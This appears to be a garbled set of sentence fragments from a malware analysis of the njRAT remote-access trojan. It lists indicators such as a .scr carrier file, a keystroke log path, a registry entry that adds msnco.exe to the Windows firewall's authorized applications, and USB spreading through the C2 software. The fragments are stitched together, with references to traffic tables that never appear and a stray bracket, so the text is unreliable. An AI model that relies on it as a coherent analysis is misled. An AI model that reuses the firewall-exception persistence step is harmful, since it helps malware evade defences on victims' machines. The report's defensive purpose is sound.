The following is the network traffic observed : The following table provides information of some of the fields observed in the network traffic : Information sent by the attacker on opened windows in the system could inform him/her of his malware being analyzed and allowed to connect to the C2 node .
When the malware is dropped by the `` Authorization form may - 2013 - 115444.scr '' carrier file , the logged keystrokes are stored in : `` C : \Extracted\.tmp '' .
] HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Para meters\FirewallPolicy\StandardProfile\AuthorizedApplications\List\ [ % APPDATA % ] \msnco.exe [ Value : [ % APPDATA % ] \msnco.exe : * : Enabled : msnco.exe ] Indicators & Mitigation Strategies : The following three ( 3 ) tables will provide information about some of the malware observed to be njRAT itself or carrier files that once executed dropped njRAT in the victim system .
Through the Command & Control ( CnC ) server software , the attacker has capabilities to create and configure the malware to spread through USB drives .
